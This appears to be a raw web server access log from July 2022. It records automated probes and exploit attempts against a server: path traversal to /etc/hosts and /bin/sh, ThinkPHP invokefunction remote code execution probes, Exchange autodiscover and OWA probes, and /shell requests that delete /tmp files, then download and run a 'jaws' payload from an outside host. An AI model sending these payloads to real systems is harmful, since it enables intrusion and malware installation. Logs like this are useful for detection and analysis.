5.188.210.227 - - [19/Jul/2022:14:34:19 +0900] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 4582 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
161.35.188.242 - - [20/Jul/2022:23:40:38 +0900] "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1" 400 157 "-" "-"
161.35.188.242 - - [20/Jul/2022:23:40:39 +0900] "GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts HTTP/1.1" 400 157 "-" "-"
185.7.214.104 - - [20/Jul/2022:23:57:18 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
95.161.131.235 - - [21/Jul/2022:08:38:25 +0900] "GET /../../mnt/mtd/Config/Account1 HTTP/1.1" 400 157 "-" "-"
185.7.214.104 - - [21/Jul/2022:08:45:51 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.215.228 - - [21/Jul/2022:11:11:53 +0900] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
185.7.214.104 - - [21/Jul/2022:13:47:39 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
185.7.214.104 - - [21/Jul/2022:20:51:53 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
121.142.145.67 - - [21/Jul/2022:22:27:06 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+ qwugdsabbdsdeeeeb212c.bydthkk.top/jaws;sh+/tmp/jaws HTTP/1.1" 404 12967 "-" "Hello, world"
192.241.221.222 - - [21/Jul/2022:23:28:58 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
185.7.214.104 - - [22/Jul/2022:09:00:06 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.222.164 - - [22/Jul/2022:11:12:33 +0900] "GET /owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
185.7.214.104 - - [22/Jul/2022:14:08:29 +0900] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 157 "-" "-"
185.186.143.111 - - [22/Jul/2022:19:01:24 +0900] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%PI:EMAIL HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
185.186.143.111 - - [22/Jul/2022:19:25:27 +0900] "GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%PI:EMAIL HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
192.241.213.19 - - [22/Jul/2022:23:26:03 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 4582 "-" "Mozilla/5.0 zgrab/0.x"
77.58.124.68 - - [23/Jul/2022:00:10:59 +0900] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
110.77.238.3 - - [23/Jul/2022:01:55:57 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+ qwugdsabbdsdeeeeb212c.bydthkk.top/jaws;sh+/tmp/jaws HTTP/1.1" 404 12967 "-" "Hello, world"
185.7.214.104 - - [23/Jul/2022:04:43:19 +0900] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 4582 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
196.188.51.244 - - [23/Jul/2022:05:07:50 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+ qwugdsabbdsdeeeeb212c.bydthkk.top/jaws;sh+/tmp/jaws HTTP/1.1" 404 12967 "-" "Hello, world"
